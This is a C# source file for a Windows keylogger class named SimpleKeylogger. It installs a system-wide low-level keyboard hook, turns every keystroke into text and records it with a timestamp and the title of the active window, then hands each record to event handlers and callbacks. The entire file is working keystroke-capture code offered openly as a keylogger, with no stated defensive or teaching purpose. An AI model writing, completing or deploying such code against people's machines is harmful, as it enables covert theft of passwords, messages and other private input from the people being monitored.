using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;

namespace SimpleKeylogger
{
    [SupportedOSPlatform("windows")]
    public sealed class Keylogger : IDisposable
    {
        //  Constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_QUIT = 0x0012;

        //  P/Invoke declarations
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode,
            byte[] lpKeyState, [Out] StringBuilder pwszBuff, int cchBuff,
            uint wFlags, IntPtr dwhkl);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        // Delegate for the low-level keyboard procedure
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //  Structures
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        //  Event arguments
        public sealed class KeyCapturedEventArgs : EventArgs
        {
            public string Text { get; }
            public uint VkCode { get; }
            public uint ScanCode { get; }
            public bool IsSystemKey { get; }
            public DateTime Timestamp { get; }
            public string WindowTitle { get; }

            public KeyCapturedEventArgs(string text, uint vkCode, uint scanCode,
                bool isSystemKey, DateTime timestamp, string windowTitle)
            {
                Text = text;
                VkCode = vkCode;
                ScanCode = scanCode;
                IsSystemKey = isSystemKey;
                Timestamp = timestamp;
                WindowTitle = windowTitle;
            }
        }

        //  Special key name dictionary
        private static readonly Dictionary<uint, string> SpecialKeyNames = new()
        {
            [0x08] = "[Backspace]", [0x09] = "[Tab]",        [0x0D] = "[Enter]",
            [0x14] = "[Caps Lock]", [0x1B] = "[Escape]",     [0x20] = "[Space]",
            [0x21] = "[Page Up]",   [0x22] = "[Page Down]",  [0x23] = "[End]",
            [0x24] = "[Home]",      [0x25] = "[Left]",       [0x26] = "[Up]",
            [0x27] = "[Right]",     [0x28] = "[Down]",       [0x2D] = "[Insert]",
            [0x2E] = "[Delete]",    [0x5B] = "[Left Win]",   [0x5C] = "[Right Win]",
            [0x5D] = "[Apps]",      [0x6A] = "[Num *]",      [0x6B] = "[Num +]",
            [0x6D] = "[Num -]",     [0x6E] = "[Num .]",      [0x6F] = "[Num /]",
            [0x90] = "[Num Lock]",  [0x91] = "[Scroll Lock]",[0xA0] = "[Left Shift]",
            [0xA1] = "[Right Shift]",[0xA2] = "[Left Ctrl]", [0xA3] = "[Right Ctrl]",
            [0xA4] = "[Left Alt]",  [0xA5] = "[Right Alt]",
            [0x70] = "[F1]", [0x71] = "[F2]", [0x72] = "[F3]", [0x73] = "[F4]",
            [0x74] = "[F5]", [0x75] = "[F6]", [0x76] = "[F7]", [0x77] = "[F8]",
            [0x78] = "[F9]", [0x79] = "[F10]",[0x7A] = "[F11]",[0x7B] = "[F12]",
            [0x60] = "[Num 0]", [0x61] = "[Num 1]", [0x62] = "[Num 2]",
            [0x63] = "[Num 3]", [0x64] = "[Num 4]", [0x65] = "[Num 5]",
            [0x66] = "[Num 6]", [0x67] = "[Num 7]", [0x68] = "[Num 8]",
            [0x69] = "[Num 9]",
        };

        //  Private fields
        private readonly CancellationTokenSource _cts = new();
        private Thread? _hookThread;
        private Thread? _consumerThread;
        private uint _hookThreadNativeId;

        private IntPtr _hookHandle = IntPtr.Zero;
        private LowLevelKeyboardProc? _proc;

        private volatile State _state = State.Stopped;
        private readonly object _stateLock = new();

        private byte[] _keyState = new byte[256];

        private BlockingCollection<KeyCapturedEventArgs> _queue = null!;

        public event EventHandler<KeyCapturedEventArgs>? KeyCaptured;
        private Action<KeyCapturedEventArgs>? _userCallback;

        private enum State { Stopped, Running, Stopping }

        //  Public API
        public void Start(Action<KeyCapturedEventArgs>? callback = null)
        {
            lock (_stateLock)
            {
                if (_state != State.Stopped)
                    return;
                _state = State.Running;
            }

            _userCallback = callback;
            _queue = new BlockingCollection<KeyCapturedEventArgs>();
            GetKeyboardState(_keyState);

            _hookThread = new Thread(HookThreadProc)
            {
                Name = "KeyloggerHook",
                IsBackground = true
            };
            _hookThread.SetApartmentState(ApartmentState.STA);
            _hookThread.Start();

            _consumerThread = new Thread(ConsumerThreadProc)
            {
                Name = "KeyloggerConsumer",
                IsBackground = true
            };
            _consumerThread.Start();
        }

        public void Stop()
        {
            lock (_stateLock)
            {
                if (_state != State.Running)
                    return;
                _state = State.Stopping;
            }

            _cts.Cancel();

            if (_hookThreadNativeId != 0)
                PostThreadMessage(_hookThreadNativeId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);

            _hookThread?.Join(TimeSpan.FromSeconds(2));
            _consumerThread?.Join(TimeSpan.FromSeconds(2));

            _queue?.Dispose();
            _hookThread = null;
            _consumerThread = null;
            _hookThreadNativeId = 0;

            lock (_stateLock)
            {
                _state = State.Stopped;
            }
        }

        public void Dispose()
        {
            Stop();
            _cts.Dispose();
        }

        //  Hook thread
        private void HookThreadProc()
        {
            _hookThreadNativeId = GetCurrentThreadId();

            _proc = HookCallback;
            using (var curProc = Process.GetCurrentProcess())
            using (var curMod = curProc.MainModule!)
            {
                _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                    GetModuleHandle(curMod.ModuleName), 0);
            }

            if (_hookHandle == IntPtr.Zero)
            {
                int err = Marshal.GetLastWin32Error();
                throw new InvalidOperationException(
                    $"Failed to install low-level keyboard hook. Error code: {err}");
            }

            MSG msg;
            int getMessageResult;
            while ((getMessageResult = GetMessage(out msg, IntPtr.Zero, 0, 0)) > 0)
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }

            if (getMessageResult == -1)
            {
                int err = Marshal.GetLastWin32Error();
                throw new InvalidOperationException(
                    $"Failed while reading the message queue. Error code: {err}");
            }

            UnhookWindowsHookEx(_hookHandle);
            _hookHandle = IntPtr.Zero;
        }

        //  Hook callback
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
            {
                try
                {
                    var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                    bool isSysKey = (wParam == WM_SYSKEYDOWN);

                    IntPtr fgWnd = GetForegroundWindow();
                    string windowTitle = GetWindowTitle(fgWnd);

                    string text = TranslateKey(kb.vkCode, kb.scanCode, kb.flags, isSysKey);

                    if (!string.IsNullOrEmpty(text))
                    {
                        var args = new KeyCapturedEventArgs(
                            text, kb.vkCode, kb.scanCode,
                            isSysKey,
                            DateTime.UtcNow,
                            windowTitle);

                        if (_state == State.Running)
                        {
                            _queue.TryAdd(args);
                        }
                    }
                }
                catch
                {
                    // Never let an exception escape a hook callback
                }
            }

            return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
        }

        //  Consumer thread
        private void ConsumerThreadProc()
        {
            try
            {
                foreach (var args in _queue.GetConsumingEnumerable(_cts.Token))
                {
                    KeyCaptured?.Invoke(this, args);
                    _userCallback?.Invoke(args);
                }
            }
            catch (OperationCanceledException)
            {
                // Normal shutdown
            }
        }

        //  Keyboard translation
        private string TranslateKey(uint vkCode, uint scanCode, uint flags, bool isSysKey)
        {
            uint threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
            IntPtr layout = GetKeyboardLayout(threadId);

            bool isExtended = (flags & 0x01) != 0;
            uint pureScanCode = scanCode & 0xFF;
            if (isExtended)
                pureScanCode |= 0xE000;

            if (vkCode < 256)
                _keyState[vkCode] |= 0x80;

            var sb = new StringBuilder(5);
            int result = ToUnicodeEx(vkCode, pureScanCode, _keyState, sb, sb.Capacity, 0, layout);

            if (vkCode < 256)
                _keyState[vkCode] &= 0x7F;

            if (result == -1)
                return string.Empty;

            if (result > 0)
                return sb.ToString();

            if (SpecialKeyNames.TryGetValue(vkCode, out string? name))
                return name;

            return $"[VK:{vkCode}]";
        }

        //  Window title helper
        private static string GetWindowTitle(IntPtr hWnd)
        {
            if (hWnd == IntPtr.Zero) return string.Empty;
            var sb = new StringBuilder(256);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        //  Message pump P/Invoke
        [DllImport("user32.dll")]
        private static extern bool PostThreadMessage(uint idThread, uint Msg,
            IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd,
            uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }
    }
}
